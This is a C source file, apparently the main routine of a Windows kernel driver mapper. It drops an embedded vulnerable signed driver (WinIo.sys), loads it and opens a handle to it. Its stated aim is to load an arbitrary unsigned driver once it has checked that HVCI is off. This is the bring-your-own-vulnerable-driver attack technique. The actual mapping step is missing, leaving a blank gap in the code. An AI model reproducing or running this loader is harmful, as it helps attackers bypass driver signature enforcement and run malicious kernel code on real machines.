#include <log.h>
#include <kdm.h>
#include <winio.h>

int main(int argc, const char** argv) {
  if (argc != 2) {
    log_info("Usage:\n");
    log_info("  %s driver.sys\n", argv[0]);
    return 0;
  }

  bool hvci_enabled;
  if (kdm_query_hvci(&hvci_enabled, NULL, NULL) && hvci_enabled) {
    log_error("HVCI is enabled\n");
    return -1;
  }

  char* driver_buffer = kdm_read_target_file(argv[1]);

  char* vendor_string;
  if (kdm_detect_hypervisor(&vendor_string)) {
    char name[13] = { 0 };
    memcpy(name, vendor_string, 12);
    log_info("Hypervisor: %s\n", name);
  }

  int firmware_type = kdm_get_firmware_type();
  log_info("Firmware: %s\n", kdm_get_firmware_type_str(firmware_type));

  if (!kdm_system_object_exist(L"\\Device", L"MsIo")) {
    if (!kdm_write_to_file("WinIo.sys", winio, sizeof(winio))) {
      log_error("Can't extract vuln driver");
      kdm_free_target(driver_buffer);
      return -1;
    }

    if (!kdm_load_driver(L"MsIo64", L"WinIo.sys", true)) {
      log_error("Failed to load vuln driver");
      kdm_free_target(driver_buffer);
      return -1;
    }

    HANDLE device_handle;
    if (!kdm_open_driver(L"MsIo64", SYNCHRONIZE | WRITE_DAC | GENERIC_WRITE | GENERIC_READ, &device_handle)) {
      log_error("Can't open handle to vuln driver");
      kdm_free_target(driver_buffer);
      return -1;
    }

    PSECURITY_DESCRIPTOR driver_sd;
    PACL default_acl;
    if (!kdm_create_system_admin_access_sd(&driver_sd, &default_acl)) {
      log_error("Can't set vuln driver device security descriptor");
      kdm_free_target(driver_buffer);
      return -1;
    }

    

    if (!kdm_unload_driver(L"MsIo64", true)) {
      log_warn("Can't unload vuln driver");
      kdm_free_target(driver_buffer);
      return -1;
    }
  }

  kdm_free_target(driver_buffer);
  return 0;
}
